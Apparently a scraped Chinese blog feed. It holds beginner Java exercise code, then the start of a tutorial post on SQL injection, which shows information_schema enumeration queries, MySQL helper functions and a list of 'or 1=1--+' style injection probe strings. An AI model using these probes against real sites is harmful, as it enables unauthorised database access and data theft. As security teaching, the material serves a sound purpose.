class="built_in">parseInt</span>(str);</div><div class="line">			<span class="built_in">switch</span> (num) &#123;</div><div class="line">			<span class="built_in">case</span> <span class="number">1</span>:</div><div class="line">				pingpang();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">2</span>:</div><div class="line">				Number_of_tracts();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">3</span>:</div><div class="line">				Average_Score();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">4</span>:</div><div class="line">				Array_reverse_order();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">5</span>:</div><div class="line">				Insert_number();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">6</span>:</div><div class="line">				Triangle();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">7</span>:</div><div class="line">				Exchange();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">8</span>:</div><div class="line">				sorts();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">9</span>:</div><div class="line">				people();</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">case</span> <span class="number">0</span>:</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			<span class="built_in">default</span>:</div><div class="line">				<span class="built_in">break</span>;</div><div class="line">			&#125;</div><div class="line">		&#125; <span class="built_in">else</span> &#123;</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"您的输入不合法,=-=!"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> pingpang() &#123;</div><div class="line">		<span class="keyword">char</span> i, j, k;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"三队选手的名单为: "</span>);</div><div class="line">		<span class="built_in">for</span> (i = <span class="string">'X'</span>; i &lt;= <span class="string">'Z'</span>; i++) &#123;</div><div class="line">			<span class="built_in">for</span> (j = <span class="string">'X'</span>; j &lt;= <span class="string">'Z'</span>; j++) &#123;</div><div class="line">				<span class="built_in">if</span> (i != j) &#123;</div><div class="line">					<span class="built_in">for</span> (k = <span class="string">'X'</span>; k &lt; <span class="string">'Z'</span>; k++) &#123;</div><div class="line">						<span class="built_in">if</span> (i != k &amp;&amp; j != k) &#123;</div><div class="line">							<span class="built_in">if</span> (i != <span class="string">'X'</span> &amp;&amp; k != <span class="string">'X'</span> &amp;&amp; k != <span class="string">'Z'</span>)</div><div class="line">								System.out.printf(<span class="string">"a -- %c\nb -- %c\nc -- %c"</span>, i, j, k);</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Number_of_tracts() &#123;</div><div class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		<span class="keyword">String</span> str = <span class="string">"\\d&#123;5&#125;"</span>;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"请输入一个五位数: "</span>);</div><div class="line">		<span class="keyword">String</span> num = sc.next();</div><div class="line">		<span class="built_in">if</span> (num.matches(str)) &#123;</div><div class="line">			<span class="keyword">int</span> number = Integer.<span class="built_in">parseInt</span>(num);</div><div class="line">			<span class="keyword">int</span> a = number % <span class="number">10</span>;</div><div class="line">			<span class="keyword">int</span> b = number / <span class="number">10</span> % <span class="number">10</span>;</div><div class="line">			<span class="keyword">int</span> c = number / <span class="number">1000</span> % <span class="number">10</span>;</div><div class="line">			<span class="keyword">int</span> d = number / <span class="number">10000</span>;</div><div class="line">			<span class="built_in">if</span> (a == d &amp;&amp; b == c) &#123;</div><div class="line">				System.out.<span class="built_in">println</span>(number + <span class="string">"是回文数!"</span>);</div><div class="line">			&#125; <span class="built_in">else</span> &#123;</div><div class="line">				System.out.<span class="built_in">println</span>(number + <span class="string">"不是回文数！"</span>);</div><div class="line">			&#125;</div><div class="line">		&#125; <span class="built_in">else</span> &#123;</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"您的输入不符合题目要求，=-=！"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Average_Score() &#123;</div><div class="line">		Student[] stu = <span class="keyword">new</span> Student[] &#123; <span class="keyword">new</span> Student(<span class="string">"小三"</span>, <span class="string">"1001"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="keyword">new</span> Student(<span class="string">"小四"</span>, <span class="string">"1002"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</div><div class="line">				<span class="keyword">new</span> Student(<span class="string">"小五"</span>, <span class="string">"1003"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="keyword">new</span> Student(<span class="string">"小六"</span>, <span class="string">"1004"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</div><div class="line">				<span class="keyword">new</span> Student(<span class="string">"小七"</span>, <span class="string">"1005"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &#125;;</div><div class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stu.length; i++) &#123;</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"请输入第"</span> + (i + <span class="number">1</span>) + <span class="string">"个学生的成绩: "</span>);</div><div class="line">			<span class="keyword">String</span> pa = <span class="string">"(\\d&#123;2&#125;)(\\.\\d+)|100?"</span>;</div><div class="line">			<span class="keyword">String</span> str1 = sc.next();</div><div class="line">			<span class="keyword">String</span> str2 = sc.next();</div><div class="line">			<span class="keyword">String</span> str3 = sc.next();</div><div class="line">			<span class="built_in">if</span> (str1.matches(pa) &amp;&amp; str2.matches(pa) &amp;&amp; str3.matches(pa)) &#123;</div><div class="line">				<span class="keyword">double</span> a = Integer.<span class="built_in">parseInt</span>(str1);</div><div class="line">				<span class="keyword">double</span> b = Integer.<span class="built_in">parseInt</span>(str2);</div><div class="line">				<span class="keyword">double</span> c = Integer.<span class="built_in">parseInt</span>(str3);</div><div class="line">				stu[i].yuwen = a;</div><div class="line">				stu[i].shuxue = b;</div><div class="line">				stu[i].yingyu = c;</div><div class="line"></div><div class="line">				<span class="keyword">double</span> avg = (stu[i].yuwen + stu[i].shuxue + stu[i].yingyu) / <span class="number">3</span>;</div><div class="line">				System.out.<span class="built_in">println</span>(stu[i].name + <span class="string">"的平均成绩是: "</span> + avg);</div><div class="line">			&#125; <span class="built_in">else</span> &#123;</div><div class="line">				System.out.<span class="built_in">println</span>(<span class="string">"您的输入不符合题目要求，=-=！"</span>);</div><div class="line">				<span class="built_in">return</span>;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> class Student &#123;</div><div class="line">		<span class="keyword">private</span> <span class="keyword">String</span> name;</div><div class="line">		<span class="keyword">private</span> <span class="keyword">String</span> number;</div><div class="line">		<span class="keyword">private</span> <span class="keyword">double</span> yuwen;</div><div class="line">		<span class="keyword">private</span> <span class="keyword">double</span> shuxue;</div><div class="line">		<span class="keyword">private</span> <span class="keyword">double</span> yingyu;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">String</span> getName() &#123;</div><div class="line">			<span class="built_in">return</span> name;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">void</span> setName(<span class="keyword">String</span> name) &#123;</div><div class="line">			<span class="keyword">this</span>.name = name;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">String</span> getNumber() &#123;</div><div class="line">			<span class="built_in">return</span> number;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">void</span> setNumber(<span class="keyword">String</span> number) &#123;</div><div class="line">			<span class="keyword">this</span>.number = number;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">double</span> getYuwen() &#123;</div><div class="line">			<span class="built_in">return</span> yuwen;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">void</span> setYuwen(<span class="keyword">double</span> yuwen) &#123;</div><div class="line">			<span class="keyword">this</span>.yuwen = yuwen;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">double</span> getShuxue() &#123;</div><div class="line">			<span class="built_in">return</span> shuxue;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">void</span> setShuxue(<span class="keyword">double</span> shuxue) &#123;</div><div class="line">			<span class="keyword">this</span>.shuxue = shuxue;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">double</span> getYingyu() &#123;</div><div class="line">			<span class="built_in">return</span> yingyu;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> <span class="keyword">void</span> setYingyu(<span class="keyword">double</span> yingyu) &#123;</div><div class="line">			<span class="keyword">this</span>.yingyu = yingyu;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		@Override</div><div class="line">		<span class="keyword">public</span> <span class="keyword">String</span> toString() &#123;</div><div class="line">			<span class="built_in">return</span> <span class="string">"Student [name="</span> + name + <span class="string">", number="</span> + number + <span class="string">", yuwen="</span> + yuwen + <span class="string">", shuxue="</span> + shuxue</div><div class="line">					+ <span class="string">", yingyu="</span> + yingyu + <span class="string">"]"</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">public</span> Student(<span class="keyword">String</span> name, <span class="keyword">String</span> number, <span class="keyword">double</span> yuwen, <span class="keyword">double</span> shuxue, <span class="keyword">double</span> yingyu) &#123;</div><div class="line">			super();</div><div class="line">			<span class="keyword">this</span>.name = name;</div><div class="line">			<span class="keyword">this</span>.number = number;</div><div class="line">			<span class="keyword">this</span>.yuwen = yuwen;</div><div class="line">			<span class="keyword">this</span>.shuxue = shuxue;</div><div class="line">			<span class="keyword">this</span>.yingyu = yingyu;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Array_reverse_order() &#123;</div><div class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"请输入数组长度： "</span>);</div><div class="line">		<span class="keyword">String</span> pa= <span class="string">"[1-9]+"</span>;</div><div class="line">		<span class="keyword">String</span> <span class="keyword">string</span>= sc.next();</div><div class="line">		<span class="built_in">if</span>(<span class="keyword">string</span>.matches(pa)) &#123;</div><div class="line">			<span class="keyword">int</span> a= Integer.<span class="built_in">parseInt</span>(<span class="keyword">string</span>);</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"请输入一组整数: "</span>);</div><div class="line"><span class="comment">//			List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span></div><div class="line">			<span class="keyword">int</span>[] n= <span class="keyword">new</span> <span class="keyword">int</span>[a];</div><div class="line">			<span class="built_in">for</span>(<span class="keyword">int</span> i= <span class="number">0</span>; i&lt; n.length; i++) &#123;</div><div class="line">				<span class="keyword">String</span> ss= sc.next();</div><div class="line">				<span class="built_in">if</span>(ss.matches(pa)) &#123;</div><div class="line">					<span class="keyword">int</span> aa= Integer.<span class="built_in">parseInt</span>(ss);</div><div class="line">					n[i]= aa;</div><div class="line">				&#125;<span class="built_in">else</span> &#123;</div><div class="line">					System.out.<span class="built_in">println</span>(<span class="string">"您的输入不合法，=-=！"</span>);</div><div class="line">					<span class="built_in">return</span> ;</div><div class="line">				&#125;				</div><div class="line">			&#125;</div><div class="line">			System.out.<span class="built_in">print</span>(<span class="string">"您输入的数为: ["</span>);</div><div class="line">			<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n.length; i++) &#123;</div><div class="line">				System.out.<span class="built_in">print</span>(n[i] + ((i == n.length - <span class="number">1</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">			&#125;</div><div class="line">			System.out.<span class="built_in">print</span>(<span class="string">"\n逆序为: ["</span>);</div><div class="line">			<span class="built_in">for</span> (<span class="keyword">int</span> j = n.length - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</div><div class="line">				System.out.<span class="built_in">print</span>(n[j] + ((j == <span class="number">0</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="built_in">else</span> &#123;</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"您的输入不合法,=-=!"</span>);</div><div class="line">			<span class="built_in">return</span> ;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Insert_number() &#123;</div><div class="line">		<span class="keyword">int</span>[] a = &#123; <span class="number">60</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">10</span> &#125;;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"该数组为: "</span>);</div><div class="line">		System.out.<span class="built_in">print</span>(<span class="string">"["</span>);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</div><div class="line">			System.out.<span class="built_in">print</span>(a[i] + ((i == a.length - <span class="number">1</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">		&#125;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"\n请向该数组中插入一个数字: "</span>);</div><div class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		<span class="keyword">String</span> pa = <span class="string">"-?\\d*\\.?\\d+"</span>;</div><div class="line">		<span class="keyword">String</span> <span class="keyword">string</span> = sc.next();</div><div class="line">		<span class="built_in">if</span> (<span class="keyword">string</span>.matches(pa)) &#123;</div><div class="line">			<span class="keyword">int</span> num = Integer.<span class="built_in">parseInt</span>(<span class="keyword">string</span>);</div><div class="line">			a = Arrays.copyOf(a, a.length + <span class="number">1</span>);</div><div class="line">			a[a.length - <span class="number">1</span>] = num;</div><div class="line">			<span class="built_in">if</span> (a[<span class="number">0</span>] &lt; a[a.length - <span class="number">2</span>]) &#123; </div><div class="line">				Arrays.sort(a);</div><div class="line">				System.out.<span class="built_in">println</span>(<span class="string">"插入一个数字后的数组为: "</span>);</div><div class="line">				System.out.<span class="built_in">print</span>(<span class="string">"["</span>);</div><div class="line">				<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</div><div class="line">					System.out.<span class="built_in">print</span>(a[i] + ((i == a.length - <span class="number">1</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">				&#125;</div><div class="line">			&#125; <span class="built_in">else</span> &#123;</div><div class="line">				Arrays.sort(a);</div><div class="line">				System.out.<span class="built_in">println</span>(<span class="string">"插入一个数字后的数组为: "</span>);</div><div class="line">				System.out.<span class="built_in">print</span>(<span class="string">"["</span>);</div><div class="line">				<span class="built_in">for</span> (<span class="keyword">int</span> i = a.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</div><div class="line">					System.out.<span class="built_in">print</span>(a[i] + ((i == <span class="number">0</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="built_in">else</span> &#123;</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"您所插入不合法，=-=！"</span>);</div><div class="line">			<span class="built_in">return</span> ;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Triangle() &#123;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"10行的杨辉三角，拿走不谢~"</span>);</div><div class="line">		<span class="keyword">int</span> i, j;</div><div class="line">		<span class="keyword">int</span>[][] num = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>][<span class="number">10</span>];</div><div class="line">		<span class="built_in">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">			num[i][<span class="number">0</span>] = <span class="number">1</span>;</div><div class="line">			num[i][i] = <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="built_in">for</span> (i = <span class="number">2</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">			<span class="built_in">for</span> (j = <span class="number">1</span>; j &lt; i; j++) &#123;</div><div class="line">				num[i][j] = num[i - <span class="number">1</span>][j - <span class="number">1</span>] + num[i - <span class="number">1</span>][j];</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="built_in">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">			<span class="built_in">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span> * (<span class="number">10</span> - i) / <span class="number">2</span>; k++) </div><div class="line">				System.out.printf(<span class="string">" "</span>);</div><div class="line"></div><div class="line">			<span class="built_in">for</span> (j = <span class="number">0</span>; j &lt;= i; j++) &#123;</div><div class="line">				System.out.printf(<span class="string">"%4d"</span>, num[i][j]);</div><div class="line">			&#125;</div><div class="line">			System.out.<span class="built_in">println</span>();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Exchange() &#123;</div><div class="line">		<span class="keyword">int</span> N = <span class="number">8</span>;</div><div class="line">		<span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[N];</div><div class="line">		Scanner s = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		<span class="keyword">int</span> idx1 = <span class="number">0</span>, idx2 = <span class="number">0</span>;</div><div class="line">		<span class="keyword">String</span> pa= <span class="string">"\\d+"</span>;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"请输入8个整数："</span>);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">			<span class="keyword">String</span> <span class="keyword">string</span>= s.next();</div><div class="line">			<span class="built_in">if</span>(<span class="keyword">string</span>.matches(pa)) &#123;</div><div class="line">				<span class="keyword">int</span> ss= Integer.<span class="built_in">parseInt</span>(<span class="keyword">string</span>);</div><div class="line">				a[i] = ss;</div><div class="line">			&#125;<span class="built_in">else</span> &#123;</div><div class="line">				System.out.<span class="built_in">println</span>(<span class="string">"您的输入不合法，=-=！"</span>);</div><div class="line">				<span class="built_in">return</span> ;</div><div class="line">			&#125;			</div><div class="line">		&#125;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"你输入的数组为："</span>);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">			System.out.<span class="built_in">print</span>(a[i] + <span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">int</span> <span class="built_in">max</span> = a[<span class="number">0</span>], <span class="built_in">min</span> = a[<span class="number">0</span>];</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">			<span class="built_in">if</span> (a[i] &gt; <span class="built_in">max</span>) &#123;</div><div class="line">				<span class="built_in">max</span> = a[i];</div><div class="line">				idx1 = i;</div><div class="line">			&#125;</div><div class="line">			<span class="built_in">if</span> (a[i] &lt; <span class="built_in">min</span>) &#123;</div><div class="line">				<span class="built_in">min</span> = a[i];</div><div class="line">				idx2 = i;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">if</span> (idx1 != <span class="number">0</span>) &#123;</div><div class="line">			<span class="keyword">int</span> temp = a[<span class="number">0</span>];</div><div class="line">			a[<span class="number">0</span>] = a[idx1];</div><div class="line">			a[idx1] = temp;</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">if</span> (idx2 != N - <span class="number">1</span>) &#123;</div><div class="line">			<span class="keyword">int</span> temp = a[N - <span class="number">1</span>];</div><div class="line">			a[N - <span class="number">1</span>] = a[idx2];</div><div class="line">			a[idx2] = temp;</div><div class="line">		&#125;</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"\n交换后的数组为："</span>);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">			System.out.<span class="built_in">print</span>(a[i] + <span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> sorts() &#123;</div><div class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"请输入8组字符串： "</span>);</div><div class="line">		<span class="keyword">String</span>[] strings = <span class="keyword">new</span> <span class="keyword">String</span>[<span class="number">8</span>];</div><div class="line">		<span class="keyword">String</span> pa= <span class="string">"[A-Za-z0-9]+"</span>;</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</div><div class="line">			<span class="keyword">String</span> <span class="keyword">string</span>= sc.next();</div><div class="line">			<span class="built_in">if</span>(<span class="keyword">string</span>.matches(pa)) &#123;</div><div class="line">				strings[i] = <span class="keyword">string</span>;</div><div class="line">			&#125;<span class="built_in">else</span> &#123;</div><div class="line">				System.out.<span class="built_in">println</span>(<span class="string">"您的输入不合法，=-=！"</span>);</div><div class="line">				<span class="built_in">return</span> ;</div><div class="line">			&#125;			</div><div class="line">		&#125;</div><div class="line">		System.out.<span class="built_in">print</span>(<span class="string">"您输入的字符串数组为: ["</span>);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strings.length; i++) &#123;</div><div class="line">			System.out.<span class="built_in">print</span>(strings[i] + ((i == strings.length - <span class="number">1</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">		&#125;</div><div class="line">		Arrays.sort(strings);</div><div class="line">		System.out.<span class="built_in">print</span>(<span class="string">"\n排序后的字符串数组为: ["</span>);</div><div class="line">		<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strings.length; i++) &#123;</div><div class="line">			System.out.<span class="built_in">print</span>(strings[i] + ((i == strings.length - <span class="number">1</span>) ? <span class="string">"]"</span> : <span class="string">","</span>));</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> people() &#123;</div><div class="line">		Scanner in = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"请输入总人数: "</span>);</div><div class="line">		<span class="keyword">String</span> paString= <span class="string">"[1-9]*"</span>;</div><div class="line">		<span class="keyword">String</span> nums = in.next();</div><div class="line">		<span class="built_in">if</span>(nums.matches(paString)) &#123;</div><div class="line">			<span class="keyword">int</span> num= Integer.<span class="built_in">parseInt</span>(nums);</div><div class="line">			<span class="keyword">boolean</span>[] man = <span class="keyword">new</span> <span class="keyword">boolean</span>[num];</div><div class="line"></div><div class="line">			<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; man.length; i++) &#123;</div><div class="line">				man[i] = true;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="keyword">int</span> t = <span class="number">0</span>, len = man.length;</div><div class="line">			<span class="built_in">while</span> (len &gt; <span class="number">1</span>) &#123;</div><div class="line">				<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; man.length; i++) &#123;</div><div class="line">					<span class="built_in">if</span> (man[i]) &#123;</div><div class="line">						t++;</div><div class="line">						<span class="built_in">if</span> (t == <span class="number">3</span>) &#123;</div><div class="line">							t = <span class="number">0</span>; </div><div class="line">							man[i] = false; </div><div class="line">							len--; </div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"最后的情况："</span> + Arrays.toString(man));</div><div class="line">			<span class="built_in">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; man.length; i++) &#123;</div><div class="line">				<span class="built_in">if</span> (man[i]) </div><div class="line">				&#123;</div><div class="line">					System.out.<span class="built_in">println</span>(<span class="string">"原来剩下的数："</span> + (i + <span class="number">1</span>)); </div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="built_in">else</span> &#123;</div><div class="line">			System.out.<span class="built_in">println</span>(<span class="string">"您的输入不合法，=-=！"</span>);</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;背景：在eclipse中可以正常运行，eclipse的编码是UTF-8；在CMD中通过javac运行则显示&lt;code&gt;错误：编码GBK的不可映射字符&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
    
      <category term="Skill" scheme="http://www.sanstylemc.cn/tags/Skill/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入一</title>
    <link href="http://www.sanstylemc.cn/2018/07/26/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/"/>
    <id>http://www.sanstylemc.cn/2018/07/26/SQL注入一/</id>
    <published>2018-07-26T08:49:22.000Z</published>
    <updated>2018-07-26T08:55:00.034Z</updated>
    
    <content type="html"><![CDATA[<p>RT<br><a id="more"></a></p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>一、MySQL有一个系统数据库information_schema, 存储这所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入。以下为一般的流程。<br>猜测数据库<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/sunstady/hexo/blob/master/SQL_One/1.png?raw=true" alt="1"><br>猜测某库的数据表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema= <span class="string">'shop'</span>;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/sunstady/hexo/blob/master/SQL_One/2.png?raw=true" alt="2"><br>猜测某表的所有列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= <span class="string">'t_sell'</span>;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/sunstady/hexo/blob/master/SQL_One/3.png?raw=true" alt="3"><br>获取某列的内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">sid</span> <span class="keyword">from</span> t_sell;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/sunstady/hexo/blob/master/SQL_One/4.png?raw=true" alt="4"></p>
<p>二、系统函数<br>1、version()—-MySQL版本<br>2、user()—-数据库用户名<br>3、database()—-数据库名<br>4、@@datadir—-数据库路径<br>5、@@version_compile_os—-操作系统版本</p>
<p>三、字符串连接函数<br>1、concat(Str1, str2,…)—-没有分隔符的连接字符串<br>2、concat_ws(separator, str1, str2,…)—-含有分隔符的连接字符串<br>3、group_concat(str1, str2,…)—-连接一个组的所有字符串，并以逗号分隔每一条数据</p>
<p>四、一般用于尝试的语句<br>Ps: –+可以用#替换<br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--+</span></div><div class="line"><span class="string">'or 1=1--+</span></div><div class="line"><span class="string">"or 1=1--+</span></div><div class="line"><span class="string">)or 1=1--+</span></div><div class="line"><span class="string">'</span>)<span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--+</span></div><div class="line"><span class="string">") or 1=1--+</span></div><div class="line"><span class="string">"</span>))<span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--+</span></div></pre></td></tr></table></figure></p>
<p>五、union操作符的介绍<br>UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列的顺序必须相同。</p>
